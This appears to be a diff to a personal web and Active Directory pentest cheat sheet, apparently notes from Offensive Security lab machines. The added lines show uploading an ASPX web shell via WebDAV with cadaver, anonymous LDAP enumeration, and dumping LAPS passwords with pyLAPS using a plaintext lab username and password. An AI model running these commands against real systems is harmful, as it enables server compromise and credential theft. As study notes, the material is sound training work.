@@ -98,6 +98,9 @@ Web App Pentest
         ffuf -u http://example.com/ -w <wordlist of subdomains> -H 'Host: FUZZ.example.com' 
         
     File Upload:
+        on ASPNET if we already know some credentials we can upload with cadaevar:
+            cadaver http://192.168.120.108
+            put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
         https://www.youtube.com/watch?v=GnUfp6z_Vu4&list=PLmqenIp2RQciV955S2rqGAn2UOrR2NX-v&index=13
         
     Command Injection
@@ -472,6 +475,12 @@ metasploit autorun scripts:
     sudo msfconsole -r scipt.rc
 
 ACTIVE DIRECTORY:
+
+    before we get in, we can enum ldap:
+        ldapsearch -x -H ldap://192.168.241.122 -D '' -w '' -b "DC=hutch,DC=offsec"
+    ldab if we know creds:      
+       python3 pyLAPS.py --dc-ip 192.168.241.122 -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192
+
     Enum:
 
         net user /domain
